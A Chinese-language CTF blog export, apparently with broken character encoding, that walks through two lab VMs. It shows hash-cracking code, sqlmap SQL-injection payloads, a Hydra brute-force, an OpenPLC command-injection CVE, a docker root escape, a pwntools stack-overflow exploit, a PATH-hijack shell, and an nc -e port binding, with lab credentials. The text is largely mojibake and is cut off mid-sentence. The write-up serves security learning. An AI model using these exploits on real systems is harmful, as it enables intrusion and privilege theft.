å­—å…¸æ•´åˆåˆ°ä¸€ä¸ªé‡Œé¢è¿›è¡Œè·‘ã€‚\nä¸Šå›¾åº”è¯¥æ˜¯æˆ‘ä¹‹å‰åœ¨Githubä¸Šæ‰¾çš„å­—å…¸ã€‚æ•´åˆå¯ä»¥è®©AIç»™å‡ºä»£ç ï¼Œè¿™é‡Œæˆ‘å°±ä¸å†™äº†ã€‚\nimport hashlib\r# ç›®æ ‡å“ˆå¸Œå€¼å’Œç›\rtarget_hash = \u0026#34;7c21f3b3cace708d3e270b44dd40d522\u0026#34; # ä½ æå–åˆ°çš„å“ˆå¸Œ\rsalt = \u0026#34;711c5b8581584acc\u0026#34; # ä½ æå–åˆ°çš„ç›\rwordlist_path = \u0026#34;/usr/share/SecLists/Passwords/clean_passwords.txt\u0026#34; # æœ¬åœ°å¯†ç å­—å…¸è·¯å¾„\rdef crack_md5_hash(target_hash, salt, wordlist_path):\rtry:\rwith open(wordlist_path, \u0026#34;r\u0026#34;, encoding=\u0026#34;latin-1\u0026#34;) as file:\rfor password in file:\rpassword = password.strip()\rsalted_password = salt+ password # CMS Made Simple ä½¿ç”¨ \u0026#34;å¯†ç +ç›\u0026#34; æ–¹å¼\rhashed_password = hashlib.md5(salted_password.encode()).hexdigest()\rif hashed_password == target_hash:\rprint(f\u0026#34;[+] å¯†ç ç ´è§£æˆåŠŸï¼å¯†ç æ˜¯: {password}\u0026#34;)\rreturn\rprint(\u0026#34;[-] æœªèƒ½æ‰¾åˆ°åŒ¹é…çš„å¯†ç ï¼Œè¯·å°è¯•æ›´å¤§çš„å­—å…¸ã€‚\u0026#34;)\rexcept FileNotFoundError:\rprint(f\u0026#34;[-] æ— æ³•æ‰¾åˆ°å­—å…¸æ–‡ä»¶: {wordlist_path}\u0026#34;)\rexcept Exception as e:\rprint(f\u0026#34;[-] å‘ç”Ÿé”™è¯¯: {e}\u0026#34;)\r# æ‰§è¡Œç ´è§£\rcrack_md5_hash(target_hash, salt, wordlist_path) Gobuster #\rè¿™ä¸ªæ—¶å€™å°è¯•å¯»æ‰¾ç™»å½•ç‚¹ï¼Œå‘ç°adminè·¯ç”±\n[root@kali] /home/kali/Entropy â¯ gobuster dir -u http://192.168.56.117/cmsms -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 50 -x php\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.117/cmsms\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/modules (Status: 301) [Size: 324] [--\u0026gt; http://192.168.56.117/cmsms/modules/]\r/uploads (Status: 301) [Size: 324] [--\u0026gt; http://192.168.56.117/cmsms/uploads/]\r/index.php (Status: 200) [Size: 20019]\r/doc (Status: 301) [Size: 320] [--\u0026gt; http://192.168.56.117/cmsms/doc/]\r/admin (Status: 301) [Size: 322] [--\u0026gt; http://192.168.56.117/cmsms/admin/]\r/assets (Status: 301) [Size: 323] [--\u0026gt; http://192.168.56.117/cmsms/assets/]\r/.php (Status: 403) [Size: 279]\r/lib (Status: 301) [Size: 320] [--\u0026gt; http://192.168.56.117/cmsms/lib/]\r/config.php (Status: 200) [Size: 0]\r/tmp (Status: 301) [Size: 320] [--\u0026gt; http://192.168.56.117/cmsms/tmp/]\r/.php (Status: 403) [Size: 279]\rProgress: 2547664 / 2547666 (100.00%)\r===============================================================\rFinished\r=============================================================== ç™»å½•è¿›å»åå‘ç°ï¼Œå¯ä»¥ä¸Šä¼ æ¨¡å—\nRCE to www-data #\rCMS Made Simple Authenticated RCE via object injection æˆåŠŸæ¥æ”¶åˆ°åå¼¹Shell\nHydra #\ræŸ¥çœ‹config.php\nmeterpreter \u0026gt; cat config.php\r\u0026lt;?php\r# CMS Made Simple Configuration File\r# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference\r#\r$config[\u0026#39;dbms\u0026#39;] = \u0026#39;mysqli\u0026#39;;\r$config[\u0026#39;db_hostname\u0026#39;] = \u0026#39;localhost\u0026#39;;\r$config[\u0026#39;db_username\u0026#39;] = \u0026#39;cmsuser\u0026#39;;\r$config[\u0026#39;db_password\u0026#39;] = \u0026#39;!@$john!@$\u0026#39;;\r$config[\u0026#39;db_name\u0026#39;] = \u0026#39;cmsms\u0026#39;;\r$config[\u0026#39;db_prefix\u0026#39;] = \u0026#39;cms_\u0026#39;;\r$config[\u0026#39;timezone\u0026#39;] = \u0026#39;America/New_York\u0026#39;; ç”±äºåªèƒ½é€šè¿‡å¯†é’¥ç™»å½•ï¼Œè¿™é‡Œæ‹¿åˆ°ä¹Ÿæ²¡ä»€ä¹ˆç”¨ï¼Œä¸Šlinpeasï¼ï¼\næ³¨æ„åˆ°å†…ç½‘ç«¯å£8080æ˜¯å¼€æ”¾çš„\næŸ¥çœ‹è¿›ç¨‹å‘ç°æ˜¯supportç”¨æˆ·åœ¨è¿è¡Œï¼Œè¿™é‡Œåº”è¯¥æ˜¯å…¥æ‰‹ç‚¹\nä¸Šä¼ ä¸€ä¸ªsocatï¼Œå°†ç«¯å£è½¬å‘å‡ºæ¥\n./socat TCP-LISTEN:9090,reuseaddr,fork TCP:127.0.0.1:8080 \u0026amp; å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œä¹‹å‰çš„ç”¨æˆ·åœ¨è¿™é‡Œæ— æ³•ç™»å½•\nç»è¿‡æœç´¢ï¼Œå¾—åˆ°é»˜è®¤è´¦æˆ·æ˜¯openplcï¼Œä½†æ˜¯å¯†ç å·²ç»è¢«ä¿®æ”¹è¿‡äº†\nè¿™é‡Œä½¿ç”¨hydraè¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°å¯†ç æ˜¯bubbles\n[root@kali] /home/kali/Entropy â¯ hydra -l openplc -P /usr/share/wordlists/rockyou.txt -s 9090 192.168.56.117 http-post-form \u0026#34;/login:username=^USER^\u0026amp;password=^PASS^:F=Bad credentials! Try again\u0026#34; -I\rHydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\rHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-12 22:09:55\r[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore\r[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task\r[DATA] attacking http-post-form://192.168.56.117:9090/login:username=^USER^\u0026amp;password=^PASS^:F=Bad credentials! Try again\r[9090][http-post-form] host: 192.168.56.117 login: openplc password: bubbles\r1 of 1 target successfully completed, 1 valid password found\rHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-12 22:09:57 RCE to user #\rthewhiteh4t/cve-2021-31630: Python script for exploiting command injection in Open PLC Webserver v3 å†™å…¥å…¬é’¥ä¹‹åï¼Œå¯ä»¥è¿›è¡Œsshç™»å½•ï¼Œæ‹¿åˆ°user.txt\nRoot #\ræŸ¥çœ‹åˆ°ç•™è¨€\nsupport@debian:~/Desktop$ cat note.txt Subject: Important: Password Change Notification\rDear Support,\rFor security reasons, I have changed your password to this \u0026#34;ap580903\u0026#34; plus the year your were born! Please make sure to update it as soon as possible.\rIf you experience any issues or need assistance, feel free to reach out.\rBest, System Administrator å‘ç°å¯†ç æ˜¯ap580903åŠ ä¸Šä¸€ä¸ªå¹´ä»½ï¼Œä¸Šä¼ suForceï¼Œå¾—åˆ°å¯†ç æ˜¯ï¼šap5809031995\næŸ¥çœ‹ç‰¹æ®Šå‘½ä»¤\nsupport@debian:~$ sudo -l\r[sudo] password for support: Matching Defaults entries for support on debian:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty, timestamp_timeout=1\rUser support may run the following commands on debian:\r(ALL) /usr/bin/docker docker | GTFOBins æŸ¥çœ‹ä¸€ä¸‹å®¹å™¨\nsudo /usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt sh Summary #\rUserï¼šSQLæ³¨å…¥æ‹¿åˆ°www-dataæƒé™ï¼Œå‘ç°supportç”¨æˆ·æœ‰æœåŠ¡è¿è¡Œåœ¨å†…ç½‘ï¼Œè½¬å‘å†…ç½‘ç«¯å£ï¼Œé€šè¿‡cve-2021-31630åå¼¹shellï¼Œæ‹¿åˆ°supportç”¨æˆ·ã€‚\nRootï¼šæ ¹æ®ç•™è¨€å¾—åˆ°å¯†ç é€»è¾‘ï¼Œçˆ†ç ´åé€šè¿‡sudo dockeræ‹¿åˆ°root.txtã€‚\n","date":"2025-03-13","externalUrl":null,"permalink":"/posts/2025/03/vulnvm-entropy/","section":"Posts","summary":"","title":"VulnVM-Entropy","type":"posts"},{"content":"","date":"2025-03-12","externalUrl":null,"permalink":"/categories/ctf/","section":"Categories","summary":"","title":"Ctf","type":"categories"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali â¯ nmap 192.168.56.116 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)\r| ssh-hostkey: | 2048 5d:41:2a:c1:2d:3b:6c:78:b3:af:ae:9d:42:fe:88:b8 (RSA)\r| 256 3c:e9:64:eb:84:fe:5c:83:94:07:27:6c:12:14:c8:4c (ECDSA)\r|_ 256 09:9b:2b:18:de:6c:6d:f8:8b:15:df:6c:0f:c0:7c:b2 (ED25519)\r80/tcp open http Apache httpd 2.4.59 ((Debian))\r|_http-server-header: Apache/2.4.59 (Debian)\r|_http-title: News Website\r65000/tcp filtered unknown Gobuster #\r[root@kali] /home/kali â¯ gobuster dir -u http://192.168.56.116/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.116/\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,html,txt\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 279]\r/index.html (Status: 200) [Size: 3118]\r/news.php (Status: 200) [Size: 1301]\r/.html (Status: 403) [Size: 279]\r/.php (Status: 403) [Size: 279]\r/.html (Status: 403) [Size: 279]\r/littlesecrets (Status: 301) [Size: 324] [--\u0026gt; http://192.168.56.116/littlesecrets/]\r/server-status (Status: 403) [Size: 279]\rProgress: 882240 / 882244 (100.00%)\r===============================================================\rFinished\r=============================================================== é’ˆå¯¹è¿™ä¸ª**/littlesecrets**å†æ¬¡è¿›è¡Œæ‰«æ\n[root@kali] /home/kali â¯ gobuster dir -u http://192.168.56.116/littlesecrets -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.116/littlesecrets\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,html,txt\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 279]\r/.html (Status: 403) [Size: 279]\r/login.php (Status: 200) [Size: 1983]\r/manager.php (Status: 302) [Size: 0] [--\u0026gt; login.php]\r/.html (Status: 403) [Size: 279]\r/.php (Status: 403) [Size: 279]\rProgress: 882240 / 882244 (100.00%)\r===============================================================\rFinished\r=============================================================== SQL Injection #\r[root@kali] /home/kali/singdancerap â¯ sqlmap -u \u0026#34;http://192.168.56.116/littlesecrets/login.php\u0026#34; --data \u0026#34;username=123\u0026amp;password=123\u0026#34; -p username --level 5\rsqlmap identified the following injection point(s) with a total of 2625 HTTP(s) requests:\r---\rParameter: username (POST)\rType: time-based blind\rTitle: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\rPayload: username=123\u0026#39; AND (SELECT 9142 FROM (SELECT(SLEEP(5)))mFLQ)-- TXmn\u0026amp;password=123\r--- å¯ä»¥çœ‹åˆ°å­˜åœ¨SQLæ³¨å…¥æ¼æ´\næŸ¥çœ‹æ•°æ®åº“\n[root@kali] /home/kali/singdancerap â¯ sqlmap -u \u0026#34;http://192.168.56.116/littlesecrets/login.php\u0026#34; --data \u0026#34;username=123\u0026amp;password=123\u0026#34; -p username --level 5 --dbs available databases [4]:\r[*] information_schema\r[*] mysql\r[*] news_db\r[*] performance_schema æŸ¥çœ‹è¡¨\n[root@kali] /home/kali/singdancerap â¯ sqlmap -u \u0026#34;http://192.168.56.116/littlesecrets/login.php\u0026#34; --data \u0026#34;username=123\u0026amp;password=123\u0026#34; -p username --level 5 -D news_db --tables Database: news_db\r[2 tables]\r+-------+\r| news |\r| users |\r+-------+ è·å–åˆ°ç”¨æˆ·\n[root@kali] /home/kali/singdancerap â¯ sqlmap -u \u0026#34;http://192.168.56.116/littlesecrets/login.php\u0026#34; --data \u0026#34;username=123\u0026amp;password=123\u0026#34; -p username --level 5 -D news_db -T users --dump\rDatabase: news_db\rTable: users\r[2 entries]\r+----+-----------+----------+\r| id | password | username |\r+----+-----------+----------+\r| 1 | password1 | user1 |\r| 2 | password2 | user2 |\r+----+-----------+----------+ ä½†æ˜¯æ— æ³•ç›´æ¥ç™»å½•\nè¿™é‡Œçš„æ³¨å…¥ç‚¹åœ¨æ—¶é—´ç›²æ³¨ï¼Œç”±äºæˆ‘å·²ç»çŸ¥é“äº†newsçš„åˆ—æ•°ï¼Œå¯ä»¥è¿”å›åˆ°æ–°é—»ä¸»é¡µè¿›è¡Œè”åˆæ³¨å…¥ã€‚\nï¼ˆè¿™é‡Œä¹‹å‰èµ°äº†å¼¯è·¯ï¼Œç›²æ³¨ä¼šæµªè´¹å¾ˆå¤šæ—¶é—´ã€‚ã€‚ã€‚ã€‚\n[root@kali] /home/kali/singdancerap â¯ sqlmap -u \u0026#34;http://192.168.56.116/news.php?title=sing\u0026#34; ---\rParameter: title (GET)\rType: boolean-based blind\rTitle: AND boolean-based blind - WHERE or HAVING clause\rPayload: title=sing\u0026#39; AND 8471=8471 AND \u0026#39;tXIm\u0026#39;=\u0026#39;tXIm\rType: time-based blind\rTitle: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\rPayload: title=sing\u0026#39; AND (SELECT 8023 FROM (SELECT(SLEEP(5)))QuwV) AND \u0026#39;rjTs\u0026#39;=\u0026#39;rjTs\rType: UNION query\rTitle: Generic UNION query (NULL) - 3 columns\rPayload: title=sing\u0026#39; UNION ALL SELECT NULL,CONCAT(0x717a707871,0x7a6749484b6e754f74666a585a616d494d734a4776796e6f43724c4662434b6a65614d735a4b4745,0x7170707871),NULL-- -\r--- å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªhe110wor1dç”¨æˆ·\n[root@kali] /home/kali/singdancerap â¯ sqlmap -u \u0026#34;http://192.168.56.116/news.php?title=sing\u0026#34; --file-read=/etc/passwd\r[*] /root/.local/share/sqlmap/output/192.168.56.116/files/_etc_passwd\r[root@kali] /home/kali/singdancerap â¯ cat /root/.local/share/sqlmap/output/192.168.56.116/files/_etc_passwd |grep /home\rhe110wor1d:x:1001:1001::/home/he110wor1d:/bin/bash ç”±äºä¸­é—´ä»¶æ˜¯Apacheï¼Œå°è¯•è¯»å–é…ç½®æ–‡ä»¶\n[root@kali] /home/kali/singdancerap â¯ sqlmap -u \u0026#34;http://192.168.56.116/news.php?title=sing\u0026#34; --file-read=/etc/apache2/apache2.conf å¯ä»¥çœ‹åˆ°ç½‘ç«™çš„è·¯å¾„ï¼Œå› æ­¤å°è¯•è¯»å–manager.phpçš„å†…å®¹\n[root@kali] /home/kali/singdancerap â¯ sqlmap -u \u0026#34;http://192.168.56.116/news.php?title=sing\u0026#34; --file-read=/var/www/he110wor1d/littlesecrets/manager.php\r....\r\u0026lt;?php\rsession_start();\rif (!isset($_SESSION[\u0026#39;username\u0026#39;])) {\rheader(\u0026#34;Location: login.php\u0026#34;);\rexit();\r}\rif ($_SESSION[\u0026#39;username\u0026#39;] !== \u0026#39;he110wor1d_admin\u0026#39;) {\rdie(\u0026#34;Access Denied. You do not have permission to access this page.\u0026#34;);\r}\r$command_output = \u0026#39;\u0026#39;;\rif ($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] == \u0026#34;POST\u0026#34; \u0026amp;\u0026amp; isset($_POST[\u0026#39;command\u0026#39;])) {\r$command = $_POST[\u0026#39;command\u0026#39;];\r$command_output = shell_exec($command);\r}\r?\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;div class=\u0026#34;manager-container\u0026#34;\u0026gt;\r\u0026lt;h2\u0026gt;Manager Panel\u0026lt;/h2\u0026gt;\r\u0026lt;form action=\u0026#34;manager.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;command\u0026#34; placeholder=\u0026#34;Enter command\u0026#34; required\u0026gt;\r\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Execute\u0026#34;\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;?php if (!empty($command_output)): ?\u0026gt;\r\u0026lt;div class=\u0026#34;output\u0026#34;\u0026gt;\r\u0026lt;h3\u0026gt;Command Output:\u0026lt;/h3\u0026gt;\r\u0026lt;pre\u0026gt;\u0026lt;?php echo htmlspecialchars($command_output); ?\u0026gt;\u0026lt;/pre\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;?php endif; ?\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/body\u0026gt; å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªå‚æ•°å¯ä»¥æ§åˆ¶ï¼Œä½†æ˜¯å¿…é¡»è¦sessionå€¼æ­£ç¡®ï¼Œè¿™é‡Œæˆ‘å°è¯•è¿‡å†™å…¥sessionæ–‡ä»¶ï¼Œä½†æ˜¯ä¸èµ·ä½œç”¨ã€‚\nè¯»å–ä¸€ä¸‹login.phpï¼Œçœ‹åˆ°äº†åŸºæœ¬çš„ç™»å½•é€»è¾‘ï¼Œå•å¼•å·é—­åˆã€‚\n[root@kali] /home/kali/singdancerap â¯ sqlmap -u \u0026#34;http://192.168.56.116/news.php?title=sing\u0026#34; --file-read=/var/www/he110wor1d/littlesecrets/login.php \u0026lt;?php\r// Database connection\r$servername = \u0026#34;localhost\u0026#34;;\r$username = \u0026#34;root\u0026#34;;\r$password = \u0026#34;i_love_sing_dance_rap\u0026#34;;\r$dbname = \u0026#34;news_db\u0026#34;;\r$conn = new mysqli($servername, $username, $password, $dbname);\rif ($conn-\u0026gt;connect_error) {\rdie(\u0026#34;Connection failed: \u0026#34; . $conn-\u0026gt;connect_error);\r}\r$login_error = \u0026#34;\u0026#34;;\rif ($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] == \u0026#34;POST\u0026#34;) {\r$username = $_POST[\u0026#39;username\u0026#39;];\r$password = $_POST[\u0026#39;password\u0026#39;];\r$sql = \u0026#34;SELECT id, username, password FROM users where username=\u0026#39;$username\u0026#39;\u0026#34;;\r$result = $conn-\u0026gt;query($sql);\rif ($result-\u0026gt;num_rows \u0026gt; 0) {\r$row = $result-\u0026gt;fetch_assoc();\rif ($password === $row[\u0026#39;password\u0026#39;]) {\rsession_start();\r$_SESSION[\u0026#39;user_id\u0026#39;] = $row[\u0026#39;id\u0026#39;];\r$_SESSION[\u0026#39;username\u0026#39;] = $row[\u0026#39;username\u0026#39;];\rheader(\u0026#34;Location: manager.php\u0026#34;);\rexit();\r} else {\r$login_error = \u0026#34;Invalid username or password.\u0026#34;;\r}\r} else {\r$login_error = \u0026#34;Invalid username or password.\u0026#34;;\r}\r}\r$conn-\u0026gt;close();\r?\u0026gt; å› æ­¤å¯ä»¥æ„é€ payload\nusername: \u0026#39; union select 1,\u0026#39;he110wor1d_admin\u0026#39;,\u0026#39;pass\rpassword: pass åå¼¹shellä¹‹ååˆ‡æ¢ç”¨æˆ·å³å¯ï¼Œç„¶åå†™å…¥sshå¯†é’¥ã€‚\nRoot #\råœ¨ç”¨æˆ·ç›®å½•ä¸‹æŸ¥æ‰¾åˆ°ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶thekey2rootï¼Œä½¿ç”¨32ä½idaè¿›è¡Œåç¼–è¯‘\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rsystem(\u0026#34;echo \u0026#39;input something:\u0026#39;\u0026#34;);\rinput(\u0026amp;argc);\rsystem(\u0026#34;echo \u0026#39;thanks for your input\u0026#39;\u0026#34;);\rreturn 0;\r}\rint input()\r{\rchar v1[24]; // [esp+Ch] [ebp-1Ch] BYREF\rreturn __isoc99_scanf(\u0026#34;%s\u0026#34;, v1);\r}\rint sing_dance_rap()\r{\rsetuid(0);\rsetgid(0);\rreturn system(\u0026#34;echo \u0026#39;Hey,bro! What are you looking for?\u0026#39;\u0026#34;);\r} å¯ä»¥çœ‹åˆ°å¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œè®©deepseekå¸®åŠ©å†™ä¸€ä¸ªè„šæœ¬\nfrom pwn import *\r# è®¾ç½®ä¸Šä¸‹æ–‡å’Œç¨‹åºè·¯å¾„\rcontext(arch=\u0026#39;i386\u0026#39;, os=\u0026#39;linux\u0026#39;)\relf = ELF(\u0026#39;./thekey2root\u0026#39;) # æ›¿æ¢ä¸ºä½ çš„ç¨‹åºå\r# è·å–å‡½æ•°åœ°å€\rsing_dance_rap_addr = elf.symbols[\u0026#39;sing_dance_rap\u0026#39;]\rsystem_addr = elf.plt[\u0026#39;system\u0026#39;]\r# é€šè¿‡è°ƒè¯•è·å–v1çš„åœ°å€ï¼ˆä¾‹å¦‚ï¼š0xffffd0acï¼‰\rv1_addr = 0xffe8378c # æ›¿æ¢ä¸ºå®é™…åœ°å€\r# æ„é€ payload\rpayload = b\u0026#39;/bin/sh\\x00\u0026#39; # å°†/bin/shå†™å…¥ç¼“å†²åŒº\rpayload += b\u0026#39;A\u0026#39; * (32 - len(payload)) # å¡«å……è‡³32å­—èŠ‚\rpayload += p32(sing_dance_rap_addr) # è¦†ç›–è¿”å›åœ°å€åˆ°sing_dance_rap\rpayload += p32(system_addr) # sing_dance_rapè¿”å›åæ‰§è¡Œsystem\rpayload += p32(0xdeadbeef) # systemçš„è¿”å›åœ°å€ï¼ˆå ä½ï¼‰\rpayload += p32(v1_addr) # systemçš„å‚æ•°ï¼ŒæŒ‡å‘/bin/sh\r# å¯åŠ¨è¿›ç¨‹å¹¶å‘é€payload\rp = process(\u0026#39;./thekey2root\u0026#39;)\rp.send(payload) # ä½¿ç”¨sendè€Œésendlineé¿å…é™„åŠ æ¢è¡Œç¬¦\rp.interactive() # è¿›å…¥äº¤äº’æ¨¡å¼ å¯ä»¥çœ‹åˆ°æˆåŠŸè¿›å…¥åˆ°äº†sing_dance_rapå‡½æ•°ï¼Œç°åœ¨è¦æƒ³åŠæ³•æ§åˆ¶systemçš„å‚æ•°\nç”±äºinputå‡½æ•°ä¸­çš„æ•°ç»„æ˜¯åœ¨å‡½æ•°å†…éƒ¨å£°æ˜çš„ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œå¤–éƒ¨æ— æ³•è®¿é—®åˆ°\nå› æ­¤æˆ‘ä»¬è¦å¯»æ‰¾å¯ä»¥å†™å…¥æˆ–è€…èƒ½åˆ©ç”¨çš„å­—ç¬¦ä¸²ï¼Œå¾ˆé—æ†¾å¹¶ä¸å­˜åœ¨\né‚£å°±åªèƒ½æŸ¥æ‰¾ç°æœ‰çš„å­—ç¬¦ä¸²äº†\nåœ¨Cè¯­è¨€ä¸­ï¼Œå¦‚æœæ˜¯ä»¥å­—ç¬¦ä¸²åœ°å€ä½œä¸ºå‚æ•°çš„è¯ï¼Œé‚£ä¹ˆå‡½æ•°ä¼šæŒ‰ç…§å­—èŠ‚é€ä¸ªè¯»å–ï¼Œç›´åˆ°é‡åˆ° \\0 æ‰åœæ­¢\nè€Œåœ¨ä¸Šé¢å¯ä»¥çœ‹åˆ°çš„æ˜¯åœ¨0x804a03eè¿™ä¸ªä½ç½®ï¼Œä¹Ÿå°±æ˜¯sçš„åœ°å€ï¼Œåé¢åˆšå¥½æœ‰ä¸€ä¸ª**\\x00**\næœ‰äº†è¿™ä¸ªåˆæ³•çš„å­—ç¬¦ä¸²ï¼Œæ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯ä½“ç°åœ¨linuxé‡Œé¢ï¼Œå› ä¸ºå®é™…ä¸Šå‡½æ•°å†…æ‰§è¡Œçš„æ˜¯system(\u0026ldquo;s\u0026rdquo;)\né‚£ä¹ˆå¦‚æœå­˜åœ¨æœ‰ä¸€ä¸ªsçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œé‡Œé¢åˆšå¥½æœ‰ææƒéƒ¨åˆ†çš„ä»£ç ï¼Œå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤\nåœ¨æœ¬åœ°è°ƒè¯•ä¸€ä¸‹\n[root@kali] /home/kali/singdancerap â¯ export PATH=.:$PATH #è®¾ç½®å½“å‰ç›®å½•ä¼˜å…ˆ\r[root@kali] /home/kali/singdancerap â¯ cat s /bin/bash -p\r[root@kali] /home/kali/singdancerap â¯ chmod +x s å¯ä»¥çœ‹åˆ°å³ä½¿ä¸æ˜¯ä»¥rootèº«ä»½è¿è¡Œä¹Ÿå¯ä»¥æˆåŠŸ\né‚£ä¹ˆç°åœ¨è¦åšçš„å°±æ˜¯ï¼Œåœ¨é¶æœºä¸Šå£°æ˜ç¯å¢ƒå˜é‡ï¼Œç„¶ååˆ›å»ºå¯æ‰§è¡Œæ–‡ä»¶**ï¼ˆsï¼‰**ï¼Œç„¶åæŠŠäºŒè¿›åˆ¶æ–‡ä»¶æŒ‚è½½åˆ°ç«¯å£ä¸Š\nhe110wor1d@singdancerap:~/thekey2root$ cat s\r/bin/bash -p\rhe110wor1d@singdancerap:~/thekey2root$ chmod +x s\rhe110wor1d@singdancerap:~/thekey2root$ export PATH=.:$PATH\rhe110wor1d@singdancerap:~/thekey2root$ nc -lvp 12345 -e ./thekey2root ç„¶åä¿®æ”¹ä¸€ä¸‹pwnè„šæœ¬\nfrom pwn import *\r# è®¾ç½®ä¸Šä¸‹æ–‡å’Œç¨‹åºè·¯å¾„\rcontext(arch=\u0026#39;i386\u0026#39;, os=\u0026#39;linux\u0026#39;)\relf = ELF(\u0026#39;./thekey2root\u0026#39;) # æ›¿æ¢ä¸ºä½ çš„ç¨‹åºå\r# è·å–å‡½æ•°åœ°å€\rsing_dance_rap_addr = elf.symbols[\u0026#39;sing_dance_rap\u0026#39;]\rsystem_addr = elf.plt[\u0026#39;system\u0026#39;]\rs_addr = 0x804a03e # æ›¿æ¢ä¸ºå®é™…åœ°å€\r# æ„é€ payload\rpayload = b\u0026#39;/bin/sh\\x00\u0026#39; # å°†/bin/shå†™å…¥ç¼“å†²åŒº\rpayload += b\u0026#39;A\u0026#39; * (32 - len(payload)) # å¡«å……è‡³32å­—èŠ‚\rpayload += p32(sing_dance_rap_addr) # è¦†ç›–è¿”å›åœ°å€åˆ°sing_dance_rap\rpayload += p32(system_addr) # sing_dance_rapè¿”å›åæ‰§è¡Œsystem\rpayload += p32(0xdeadbeef) # systemçš„è¿”å›åœ°å€ï¼ˆå ä½ï¼‰\rpayload += p32(s_addr)\r# å¯åŠ¨è¿›ç¨‹å¹¶å‘é€payload\rp = remote(\u0026#39;192.168.56.116\u0026#39;,12345)\rp.send(payload) # ä½¿ç”¨sendè€Œésendlineé¿å…é™„åŠ æ¢è¡Œç¬¦\rp.interactive() # è¿›å…¥äº¤äº’æ¨¡å¼ Summary #\rUserï¼šç›®å½•æ‰«æå¾—åˆ°éšè—è·¯å¾„ï¼Œé€šè¿‡SQLæ³¨å…¥å¯ä»¥æŸ¥çœ‹åˆ°æ–‡ä»¶æºç ï¼Œå†æ¬¡é€šè¿‡è”åˆæ³¨å…¥ä¼ªé€ èº«ä»½ï¼Œè¿›å…¥åˆ°å‘½ä»¤æ‰§è¡Œï¼Œé€šè¿‡æ³„éœ²çš„æ•°æ®åº“å¯†ç è¿›è¡Œç™»å½•ï¼Œç„¶ååˆ‡æ¢ç”¨æˆ·æ‹¿åˆ°user.txtã€‚\nRootï¼šåç¼–è¯‘æŸ¥çœ‹åˆ°å­˜åœ¨æ 